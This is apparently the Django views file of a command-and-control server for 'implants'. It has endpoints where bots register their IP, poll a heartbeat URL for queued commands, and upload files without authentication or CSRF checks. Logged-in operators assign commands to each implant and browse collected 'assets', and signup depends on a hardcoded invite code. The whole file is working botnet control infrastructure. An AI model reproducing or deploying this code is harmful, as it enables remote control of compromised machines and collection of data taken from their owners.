from django.shortcuts import render
from django.contrib.auth.models import User
from django.contrib.auth import authenticate, login
from django.contrib.auth.decorators import login_required
from django.http import HttpResponseRedirect, HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django import forms
from .forms import *
from django.utils.translation import gettext as _
from django.core.urlresolvers import reverse
from implantapp.models import *

def index(request):
  if request.user.is_authenticated:
    user_implants = Implant.objects.filter(userID=request.user)
    count = 0
    for implant in user_implants:
      count += 1
    return render(request, 'implantapp/index.html', {'implant_ct': count})
  else:
    return render(request, 'implantapp/index.html')


@csrf_exempt
def heartbeat(request):
    if request.method == 'POST':
        form = HeartbeatForm(request.POST)
        if form.is_valid():
            userID = form.cleaned_data.get('userID')
            botID = form.cleaned_data.get('botID')
            implants = Implant.objects.filter(implantID=botID)
            if implants:
                return_str = 'Command:' + implants[0].command
                implants[0].command = 0
                implants[0].save()
            else:
                return_str = 'Command:3'
            return HttpResponse(return_str)
    else:
        form = HeartbeatForm()
        return render(request, 'heartbeat.html', {'form': form})

@csrf_exempt
def upload(request):
    if request.method == 'POST':
        form = UploadForm(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            return HttpResponseRedirect(reverse('fileupload'))
    else:
        form = UploadForm()
    files=Upload.objects.all()
    return render(request, 'upload.html', {'form': form, 'files':files})

@csrf_exempt
def register(request):
    if request.method == 'POST':
        form = PartialRegisterForm(request.POST)
        if form.is_valid():
            implant = form.save(commit=False)
            implant.ipAddress = getClientIpAddr(request)
            implant.command = 0;
            form.save()
            return HttpResponseRedirect(reverse('registerImplant'))
    else:
        form = PartialRegisterForm()
    return render(request, 'register.html', {'form': form})

def getClientIpAddr(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ipClient = x_forwarded_for.split(',')[0]
    else:
        ipClient = request.META.get('REMOTE_ADDR')
    return ipClient

def signup(request):
  if request.method == 'POST':
    form = UserRegistrationForm(request.POST)
    if form.is_valid():
      username = form.cleaned_data.get('username')
      raw_password = form.cleaned_data.get('password')
      confirm_password = form.cleaned_data.get('password_confirm')
      invite_code = form.cleaned_data.get('invite_code')
      if not (invite_code == 'adamthinksheisc00l'):
        form.add_error(None, 'Invalid invite code.')
      elif not (raw_password == confirm_password):
        form.add_error(None, 'Passwords do not match. Try again.')
      else:
        if not (User.objects.filter(username=username).exists()):
          # None below indicates no email needed
          user = User.objects.create_user(username, None, raw_password)
          user.save()
          login(request, user)
          return HttpResponseRedirect('/')
        else:
          form.add_error(None, 'Username already taken. Please try again.')
  else:
    form = UserRegistrationForm()
    
  return render(request, 'signup.html', {'form': form})

@login_required(login_url='/account/login')
def implants(request):
    if request.method == 'POST':
        form = CommandForm(request.POST)
        if form.is_valid():
            implant_id = form.cleaned_data.get('implantID')
            new_command = form.cleaned_data.get('command')
            implant = Implant.objects.filter(userID=request.user,implantID=implant_id)[0] # [0] gets first object in the queryset
            if implant:
                implant.command = new_command
                implant.save() # saves to the database
                
            return HttpResponseRedirect(reverse('implants'))
    else:
        form = CommandForm()
    
    user_implants = Implant.objects.filter(userID=request.user).order_by('implantID')
    return render(request, 'implantapp/implants.html', {'user_implants': user_implants, 'form':form})

@login_required(login_url='/account/login')
def assets(request):
  files = Upload.objects.filter(userID=request.user)
  return render(request, 'implantapp/assets.html', {'files': files})

@login_required(login_url='/account/login')
def help(request):
  return render(request, 'implantapp/help.html') 

@login_required(login_url='/account/login')
def create(request):
  return render(request, 'implantapp/create_implant.html')

def contact(request):
  return render(request, 'implantapp/contact.html')
